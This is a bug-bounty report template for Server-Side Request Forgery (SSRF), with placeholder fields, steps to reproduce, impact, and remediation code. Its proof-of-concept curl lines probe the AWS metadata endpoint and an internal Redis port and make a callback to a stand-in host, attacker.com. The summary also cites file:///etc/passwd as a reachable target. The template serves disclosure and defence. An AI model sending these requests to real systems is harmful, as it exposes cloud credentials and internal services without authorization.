# Server-Side Request Forgery (SSRF) Bug Report

## Report Template

**Platform:** [HackerOne/Bugcrowd/Intigriti]
**Program:** `[PROGRAM_NAME]`
**Vulnerability:** Server-Side Request Forgery (SSRF)
**Severity:** CRITICAL / HIGH / MEDIUM
**Report Date:** YYYY-MM-DD
**Target URL:** `https://api.target.com/fetch?url=`
**CWE:** CWE-918: Server-Side Request Forgery

---

## Summary

A Server-Side Request Forgery (SSRF) vulnerability was discovered in `[TARGET_ENDPOINT]`, allowing an attacker to induce the server to make arbitrary HTTP requests to internal or external resources.

**Attack Scenario:** An attacker can provide a malicious URL (e.g., `http://169.254.169.254/`) that the vulnerable server will fetch, potentially exposing:
- Cloud provider metadata (AWS, GCP, Azure)
- Internal services and databases
- Local file system (`file:///etc/passwd`)
- Internal network scanning results

---

## Description

[Describe the vulnerability and how it was discovered]

The affected endpoint accepts user-controlled input that is used to construct URLs for server-side requests without proper validation.

---

## Steps to Reproduce

1. Navigate to [affected URL]
2. Identify the parameter that controls the URL [e.g., ?url=, ?dest=, ?next=]
3. Inject a internal resource URL like `http://169.254.169.254/latest/meta-data/` (AWS metadata)
4. Or inject an external URL to confirm out-of-band interaction

---

## PoC (Proof of Concept)

```bash
# Test AWS Metadata access
curl -X GET "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# Expected: Server makes request to AWS metadata endpoint
# If successful, confirms SSRF

# Test internal port scanning
curl -X GET "https://target.com/api/fetch?url=http://localhost:6379/"

# Test external callback
curl -X GET "https://target.com/api/fetch?url=http://attacker.com/collab"

# Check for DNS resolution at attacker.com
```

---

## Impact

- **AWS/GCP Metadata Exposure** - Access to cloud service credentials
- **Internal Port Scanning** - Discover internal services
- **Data Exfiltration** - Access internal databases
- **Remote Code Execution** - If internal services are vulnerable

**Severity Justification:**
- Allows access to cloud metadata (critical for AWS)
- Can lead to full system compromise
- No user interaction required

---

## Remediation

1. **Whitelist allowed domains/IPs:**
```python
ALLOWED_HOSTS = ['api.target.com', 'cdn.target.com']
if request.host not in ALLOWED_HOSTS:
    abort(403)
```

2. **Use safe URL parsing libraries:**
```python
from urllib.parse import urlparse
parsed = urlparse(user_input)
if parsed.scheme not in ['http', 'https']:
    abort(400)
```

3. **Block private IP ranges:**
```python
import ipaddress
BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # AWS metadata
]
```

---

## References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [AWS Metadata Attack](https://rhinosecuritylabs.com/aws/aws-ssrf/)

---

## Timeline

- **Date Discovered:** [YYYY-MM-DD]
- **Date Reported:** [YYYY-MM-DD]
- **Date Acknowledged:** [YYYY-MM-DD]
- **Date Fixed:** [YYYY-MM-DD]

---

**Reporter:** [Your Name/HANDLE]
**Platform:** [HackerOne/Bugcrowd Profile]